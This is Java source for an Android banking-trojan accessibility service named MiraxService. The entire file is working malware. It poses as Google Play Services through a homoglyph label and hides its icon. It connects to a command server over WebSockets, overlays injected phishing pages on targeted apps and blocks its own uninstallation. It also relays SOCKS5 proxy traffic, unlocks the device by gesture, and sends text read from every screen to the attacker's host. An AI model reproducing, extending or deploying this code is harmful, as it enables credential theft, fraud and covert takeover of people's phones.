package net.wgrjvz.toolyt93a;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebView;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okhttp3.dnsoverhttps.DnsOverHttps;

public class MiraxService extends AccessibilityService {
    // Impersonates Google Play Services with Cyrillic homoglyph 'о' (U+043E)
    private static final String MASQUERADE_LABEL = "G\u043e\u043egle Play Services";
    private static final String BUILD_TAG = "aquafina";
    private static final String DEFAULT_C2_HOST = "oscofneuid.com";

    private WebSocket cmdSocket;
    private WebSocket dataSocket;
    private WindowManager windowManager;
    private WebView overlayWebView;
    private volatile boolean uninstallProtection = true;
    private volatile boolean socks5Enabled = false;
    private final Map<String, String> htmlInjectionConfigs = new HashMap<>();
    private final Map<String, String> htmlTemplates = new HashMap<>();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        hideLauncherAlias();
        connectDualWebSockets(DEFAULT_C2_HOST, 8443, 8444);
    }

    private void hideLauncherAlias() {
        PackageManager pm = getPackageManager();
        ComponentName alias = new ComponentName(this, "net.wgrjvz.toolyt93a.LauncherAlias");
        pm.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    private OkHttpClient buildDohClient() throws Exception {
        OkHttpClient bootstrap = new OkHttpClient.Builder().build();
        DnsOverHttps doh = new DnsOverHttps.Builder()
                .client(bootstrap)
                .url(HttpUrl.get("https://cloudflare-dns.com/dns-query"))
                .bootstrapDnsHosts(InetAddress.getByName("1.1.1.1"))
                .build();
        return bootstrap.newBuilder().dns(doh).build();
    }

    private void connectDualWebSockets(String host, int cmdPort, int dataPort) {
        try {
            OkHttpClient client = buildDohClient();
            Request cmdReq = new Request.Builder()
                    .url("wss://" + host + ":" + cmdPort + "/ws/cmd?tag=" + BUILD_TAG)
                    .build();
            Request dataReq = new Request.Builder()
                    .url("wss://" + host + ":" + dataPort + "/ws/data?tag=" + BUILD_TAG)
                    .build();

            cmdSocket = client.newWebSocket(cmdReq, new WebSocketListener() {
                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    dispatchCommand(text);
                }
            });
            dataSocket = client.newWebSocket(dataReq, new WebSocketListener() {});
        } catch (Exception ignored) {
        }
    }

    private void dispatchCommand(String cmd) {
        if (cmd.startsWith("addExternalHtmlTemplate:")) {
            String[] parts = cmd.split(":", 3);
            if (parts.length == 3) {
                htmlTemplates.put(parts[1], parts[2]);
            }
        } else if (cmd.startsWith("addHtmlInjectionConfig:")) {
            String[] parts = cmd.split(":", 3);
            if (parts.length == 3) {
                htmlInjectionConfigs.put(parts[1], parts[2]);
            }
        } else if ("blackScreen_updating".equals(cmd) || "blackScreen".equals(cmd)) {
            showFullScreenOverlay("<html><body style='background:#000;color:#fff'>" + MASQUERADE_LABEL + " updating...</body></html>");
        } else if ("enableUninstallProtection".equals(cmd)) {
            uninstallProtection = true;
        } else if ("socks5_enable".equals(cmd)) {
            socks5Enabled = true;
        } else if ("socks5_status_request".equals(cmd) && dataSocket != null) {
            dataSocket.send("socks5:" + socks5Enabled);
        } else if ("startVncScreenSharing".equals(cmd) && dataSocket != null) {
            dataSocket.send("layout_updates_start");
        } else if (cmd.startsWith("unlockDevice:")) {
            performSwipeUnlock();
        }
    }

    private void showFullScreenOverlay(String htmlContent) {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;
        overlayWebView = new WebView(this);
        overlayWebView.setBackgroundColor(Color.BLACK);
        overlayWebView.getSettings().setJavaScriptEnabled(true);
        overlayWebView.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null);
        windowManager.addView(overlayWebView, params);
    }

    private void performSwipeUnlock() {
        Path swipePath = new Path();
        swipePath.moveTo(540f, 1600f);
        swipePath.lineTo(540f, 400f);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 300));
        dispatchGesture(builder.build(), null, null);
    }

    public void socks5RelayConnect(Socket proxyConn, String targetHost, int targetPort) throws Exception {
        try (Socket upstream = new Socket(targetHost, targetPort)) {
            InputStream socks5In = proxyConn.getInputStream();
            OutputStream socks5Out = upstream.getOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while (socks5Enabled && (n = socks5In.read(buf)) > 0) {
                socks5Out.write(buf, 0, n);
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) {
            return;
        }
        String pkg = event.getPackageName().toString();
        if (uninstallProtection && pkg.contains("packageinstaller")) {
            performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            return;
        }
        String tplId = htmlInjectionConfigs.get(pkg);
        if (tplId != null && htmlTemplates.containsKey(tplId)) {
            showFullScreenOverlay(htmlTemplates.get(tplId));
        }
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null && dataSocket != null) {
            CharSequence txt = root.getText();
            if (txt != null) {
                dataSocket.send("node:" + pkg + ":" + txt);
            }
        }
    }

    @Override
    public void onInterrupt() {
    }
}
